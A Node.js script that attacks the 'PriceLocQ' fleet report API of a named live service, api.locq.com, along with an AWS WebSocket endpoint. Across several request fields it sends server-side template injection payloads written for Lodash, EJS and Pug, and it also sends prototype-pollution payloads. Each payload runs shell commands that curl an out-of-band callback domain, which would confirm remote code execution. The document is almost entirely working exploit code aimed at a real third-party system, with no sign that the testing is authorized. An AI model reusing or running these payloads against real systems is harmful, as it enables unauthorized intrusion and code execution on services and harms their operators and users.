#!/usr/bin/env node
/**
 * WebSocket SSTI Test — PriceLocQ Report Generation
 *
 * The report flow:
 *   1. Client connects to WSS endpoint, gets connectionId
 *   2. connectionId is sent to ms-fleet/report/v3 as a parameter
 *   3. Server uses Lodash _.template() to generate reports
 *   4. If connectionId or report params reach _.template() unsanitized = RCE
 *
 * This script automates the full flow with SSTI payloads injected
 * at each step to see if any reach template compilation.
 */

const WebSocket = require('ws');
const https = require('https');
const http = require('http');
const { URL } = require('url');

const CONFIG = {
  wsURL: 'wss://pd3wolnhxa.execute-api.ap-southeast-1.amazonaws.com/prod',
  apiURL: 'https://api.locq.com',
  oobDomain: 'testrce.6u.gg',
  token: process.argv[2] || '',
  fleetId: process.argv[3] || '',
};

if (!CONFIG.token || !CONFIG.fleetId) {
  console.log('Usage: node ws-ssti-test.js <JWT_TOKEN> <FLEET_ID>');
  process.exit(1);
}

function httpRequest(url, method, headers, body) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const mod = parsed.protocol === 'https:' ? https : http;
    const opts = {
      hostname: parsed.hostname,
      port: parsed.port,
      path: parsed.pathname + parsed.search,
      method,
      headers: {
        'User-Agent': 'Mozilla/5.0',
        ...headers,
      },
    };
    const req = mod.request(opts, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        resolve({
          status: res.statusCode,
          body: Buffer.concat(chunks).toString('utf-8'),
        });
      });
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

const SSTI_PAYLOADS = [
  // Lodash _.template() interpolation
  "${require('child_process').exec('curl http://DOMAIN/ws-ssti-1')}",
  "<%= global.process.mainModule.require('child_process').execSync('curl http://DOMAIN/ws-ssti-2') %>",
  "<%- global.process.mainModule.require('child_process').execSync('curl http://DOMAIN/ws-ssti-3') %>",
  // Lodash template with constructor access
  "${constructor.constructor('return require(`child_process`).execSync(`curl http://DOMAIN/ws-ssti-4`)')()}",
  // Pug/EJS style
  "#{global.process.mainModule.require('child_process').execSync('curl http://DOMAIN/ws-ssti-5')}",
  // Prototype pollution + template sourceURL
  "__proto__",
];

async function testReportWithPayload(connectionId, payloadIdx, payloadField) {
  const payload = SSTI_PAYLOADS[payloadIdx].replace(/DOMAIN/g, CONFIG.oobDomain);
  const tag = `ssti-report-${payloadField}-${payloadIdx}`;

  const body = {
    fleetId: CONFIG.fleetId,
    connectionId: connectionId,
    type: 'fuel-consumption',
    startDate: '2024-01-01',
    endDate: '2024-12-31',
  };

  // Inject payload into the target field
  if (payloadField === 'connectionId') {
    body.connectionId = payload;
  } else if (payloadField === 'reportName') {
    body.reportName = payload;
  } else if (payloadField === 'type') {
    body.type = payload;
  } else if (payloadField === 'fleetId') {
    body.fleetId = payload;
  }

  console.log(`  [${tag}] Testing ${payloadField} with payload #${payloadIdx}...`);

  try {
    const resp = await httpRequest(
      `${CONFIG.apiURL}/ms-fleet/report/v3`,
      'POST',
      {
        'Authorization': CONFIG.token,
        'Content-Type': 'application/json',
      },
      JSON.stringify(body)
    );
    console.log(`    HTTP ${resp.status} | Response: ${resp.body.substring(0, 200)}`);

    // Check if error message leaks template compilation info
    if (resp.body.includes('template') || resp.body.includes('compile') ||
        resp.body.includes('eval') || resp.body.includes('SyntaxError')) {
      console.log(`    *** INTERESTING: Response contains template/eval references ***`);
    }
  } catch (e) {
    console.log(`    Error: ${e.message}`);
  }
}

async function main() {
  console.log('=== WebSocket SSTI/RCE Test ===');
  console.log(`OOB Domain: ${CONFIG.oobDomain}`);
  console.log('');

  // Step 1: Connect to WebSocket and get connectionId
  console.log('[1] Connecting to WebSocket...');

  let connectionId = null;

  try {
    const ws = new WebSocket(CONFIG.wsURL, {
      headers: { 'Authorization': CONFIG.token },
    });

    connectionId = await new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        ws.close();
        reject(new Error('WebSocket timeout'));
      }, 10000);

      ws.on('open', () => {
        console.log('    WebSocket connected');
        // Some API gateways send connectionId on connect
      });

      ws.on('message', (data) => {
        const msg = data.toString();
        console.log(`    WS Message: ${msg.substring(0, 300)}`);

        // Try to extract connectionId from the message
        try {
          const parsed = JSON.parse(msg);
          if (parsed.connectionId) {
            clearTimeout(timeout);
            resolve(parsed.connectionId);
            ws.close();
          }
        } catch {}
      });

      ws.on('error', (err) => {
        console.log(`    WS Error: ${err.message}`);
        clearTimeout(timeout);
        // Even without connectionId, we can test with a fake one
        resolve('FAKE-CONN-' + Date.now());
      });

      ws.on('close', () => {
        clearTimeout(timeout);
        resolve('WS-CLOSED-' + Date.now());
      });
    });
  } catch (e) {
    console.log(`    WebSocket failed: ${e.message}`);
    connectionId = 'FAKE-CONN-' + Date.now();
  }

  console.log(`    connectionId: ${connectionId}`);
  console.log('');

  // Step 2: Test SSTI payloads in different fields of the report API
  console.log('[2] Testing SSTI payloads on ms-fleet/report/v3...');

  const fields = ['connectionId', 'reportName', 'type', 'fleetId'];

  for (const field of fields) {
    console.log(`\n  --- Field: ${field} ---`);
    for (let i = 0; i < SSTI_PAYLOADS.length - 1; i++) {
      await testReportWithPayload(connectionId, i, field);
      // Small delay to not hammer
      await new Promise(r => setTimeout(r, 500));
    }
  }

  // Step 3: Test prototype pollution via JSON
  console.log('\n[3] Testing prototype pollution + _.template()...');

  const protoPollutionPayloads = [
    {
      fleetId: CONFIG.fleetId,
      connectionId: connectionId,
      type: 'fuel-consumption',
      startDate: '2024-01-01',
      endDate: '2024-12-31',
      "__proto__": {
        "sourceURL": "\nreturn require('child_process').exec('curl http://" + CONFIG.oobDomain + "/proto-pollution-1')//"
      }
    },
    {
      fleetId: CONFIG.fleetId,
      connectionId: connectionId,
      type: 'fuel-consumption',
      startDate: '2024-01-01',
      endDate: '2024-12-31',
      "constructor": {
        "prototype": {
          "sourceURL": "\nreturn require('child_process').exec('curl http://" + CONFIG.oobDomain + "/proto-pollution-2')//"
        }
      }
    },
  ];

  for (let i = 0; i < protoPollutionPayloads.length; i++) {
    console.log(`  [proto-${i}] Testing...`);
    try {
      const resp = await httpRequest(
        `${CONFIG.apiURL}/ms-fleet/report/v3`,
        'POST',
        {
          'Authorization': CONFIG.token,
          'Content-Type': 'application/json',
        },
        JSON.stringify(protoPollutionPayloads[i])
      );
      console.log(`    HTTP ${resp.status} | ${resp.body.substring(0, 200)}`);
    } catch (e) {
      console.log(`    Error: ${e.message}`);
    }
    await new Promise(r => setTimeout(r, 500));
  }

  // Step 4: Also test ms-report/report endpoint
  console.log('\n[4] Testing ms-report/report endpoint...');

  for (let i = 0; i < 3; i++) {
    const payload = SSTI_PAYLOADS[i].replace(/DOMAIN/g, CONFIG.oobDomain);
    console.log(`  [ms-report-${i}] payload in name field...`);
    try {
      const resp = await httpRequest(
        `${CONFIG.apiURL}/ms-report/report`,
        'POST',
        {
          'Authorization': CONFIG.token,
          'Content-Type': 'application/json',
        },
        JSON.stringify({
          fleetId: CONFIG.fleetId,
          name: payload,
          type: 'transactions',
        })
      );
      console.log(`    HTTP ${resp.status} | ${resp.body.substring(0, 200)}`);
    } catch (e) {
      console.log(`    Error: ${e.message}`);
    }
    await new Promise(r => setTimeout(r, 500));
  }

  console.log('\n=== Done. Check ' + CONFIG.oobDomain + ' for callbacks ===');
}

main().catch(console.error);
